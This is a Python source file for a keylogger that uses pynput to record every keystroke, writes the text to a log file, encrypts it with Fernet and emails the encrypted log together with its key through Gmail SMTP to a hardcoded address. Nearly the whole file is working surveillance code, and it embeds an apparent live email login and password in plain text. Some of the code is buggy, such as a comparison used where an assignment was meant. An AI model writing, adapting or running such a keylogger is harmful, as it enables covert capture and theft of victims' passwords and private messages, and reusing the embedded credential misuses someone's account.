from smtplib import SMTPException
import smtplib, email, ssl
from pynput.keyboard import Key, Listener
import certifi
from cryptography.fernet import Fernet
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import os
import re

print("Hey")
count = 0
keys = []
totalWords = [] # at a certain pint then email totalWords
otherTotal = []
singleWord = "$" # create a word, then add to total
otherWord = "$"
loadCount = 0
generateKey = False
def on_press(key):
    global keys, count

    # print(key)
    keys.append(key)
    count += 1
    # print("{0}".format(key))
    
    if count >= 10:
        count = 0
        write_to_file(keys)
        
        keys = []

def write_to_file(keys):
    global singleWord, loadCount, otherWord
    with open("log.txt","a") as f:
        for key in keys:
            k = str(key).replace("'","")
            if k.find("space") > 0:
                f.write('\n')
                totalWords.append(singleWord + ", ")
                singleWord = ""
                # print(totalWords) # after a certain amount of total words, mail the list
                # send_email(totalWords) 

                # totalWords = []
                # f.close()
            elif k.find("Key") == -1:
                f.write(k)
                singleWord = singleWord + k
                # f.close()
    if generateKey == False:
        generateKey == True
        write_key()
    # if loadCount == 0:
    myKey = load_key()
    # loadCount = 1
    # it continues to use the same key as first line each word
    with open("encryptedLog.txt","wb+") as f:
            for key in keys:
                k = str(key).replace("'","")
                if k.find("space") > 0:
                    # encrypt the word
                    # print(type(otherWord)) 
                    otherWord = otherWord + " "
                    encrypt(otherWord,myKey)
                    send_email(myKey) 
                    # decrypt(myKey)               
                elif k.find("Key") == -1: 
                    # if os.stat("encryptedLog.txt").st_size == 0:
                    #     f.write(str(myKey))
                    # encrypt(k, myKey)
                    # f.write(k)
                    # decrypt(myKey)
                    otherWord = otherWord + k

def on_release(key):
    # end by pressing escape key
    if key == Key.esc:
        return False

def send_email(key):
    subject = "Keylogger email"
    body = ' '.join(str(key)) # body is now a list object when it should be a string
    # print(body)
    # print(type(body))
    sender_email = 'storya484@gmail.com'
    sender_password = 'Python35'
    reciever_email = 'storya484@gmail.com'

    message = MIMEMultipart()
    message["From"] = sender_email
    message["To"] = reciever_email
    message["Subject"] = subject

    message.attach(MIMEText(body, 'plain'))

    filename = "encryptedLog.txt"

    with open(filename, "rb") as attachment:
        part = MIMEBase("application", "octet-stream")
        part.set_payload(attachment.read())

    encoders.encode_base64(part)

    part.add_header(
        "Content-Disposition",
        f"attachment; filename= {filename}",
    )

    message.attach(part)
    text = message.as_string()

    # code crashes here
    # ssl.SSLCertVerificationError: [SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed: unable to get local issuer certificate (_ssl.c:997)
    context = ssl.create_default_context()
    with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
        server.login(sender_email, sender_password)
        server.sendmail(sender_email, reciever_email, text)

# generate encryption key and save in file, eacxh time project runs again it creates another
def write_key():
    key = Fernet.generate_key()
    with open("key.key", "wb") as key_file:
        key_file.write(key)

def load_key():
    return open("key.key", "rb").read()
    

def encrypt(word, key):
    f = Fernet(key)
    encrypted_data = f.encrypt(word.encode('utf-8'))
    with open("encryptedLog.txt", "wb") as file:
        file.write(encrypted_data)

# def decrypt(key):
#     f = Fernet(key)
#     # print(key)
#     with open("encryptedLog.txt","rb") as file:
#         encrypted_data = file.read()
#     decrypted_data = f.decrypt(encrypted_data)
#     print(decrypted_data)
#     with open("unencryptedLog.txt", "wb") as file:
#         file.write(decrypted_data)

with Listener(on_press=on_press, on_release=on_release) as listener:
    print("listening")
    listener.join()